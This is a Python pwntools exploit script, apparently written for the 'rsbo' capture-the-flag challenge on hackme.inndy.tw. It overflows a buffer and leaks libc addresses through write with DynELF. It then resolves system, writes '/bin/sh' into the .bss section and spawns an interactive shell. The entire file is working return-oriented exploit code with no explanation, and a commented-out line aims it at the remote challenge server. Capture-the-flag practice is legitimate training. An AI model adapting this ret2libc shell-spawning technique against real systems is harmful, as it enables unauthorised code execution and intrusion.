#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'niexinming'

from pwn import *
context(terminal = ['gnome-terminal', '-x', 'sh', '-c'], arch = 'i386', os = 'linux', log_level = 'debug')

def debug(addr = '0x08048729'):
    raw_input('debug:')
    gdb.attach(io, "b *" + addr)

elf = ELF('/home/h11p/hackme/rsbo')
open_addr=elf.plt["open"]
read_addr=elf.plt["read"]
write_addr=elf.plt["write"]
bss_addr=elf.bss()

io = process('/home/h11p/hackme/rsbo')

#io = remote('hackme.inndy.tw',7706)

start_addr=0x08048490
main_addr=0x0804867F
flag_addr=0x080487D0
pop_pop_ret=0x0804879e # pop edi ; pop ebp ; ret
pop_pop_pop_ret=0x0804879d # pop esi ; pop edi ; pop ebp ; ret

def leak(address):
    payload1 = "\x00" * 108 + p32(write_addr)+p32(start_addr) + p32(1) + p32(address) + p32(4)
    io.send(payload1)
    data = io.recv(4)
    log.info("%#x => %s" % (address, (data or '').encode('hex')))
    return data


#debug(addr=hex(read_addr))

d = DynELF(leak, elf=elf)
system_addr= d.lookup('system', 'libc')

print "system:"+hex(system_addr)
print "bss:"+hex(bss_addr)

payload2 = "\x00" * 108 + p32(read_addr) + p32(start_addr) + p32(0) + p32(bss_addr) + p32(9)
payload3 = "\x00" * 108 + p32(system_addr) + p32(start_addr) + p32(bss_addr)

io.send(payload2)
io.sendline("/bin/sh\0")
io.send(payload3)




io.interactive()

io.close()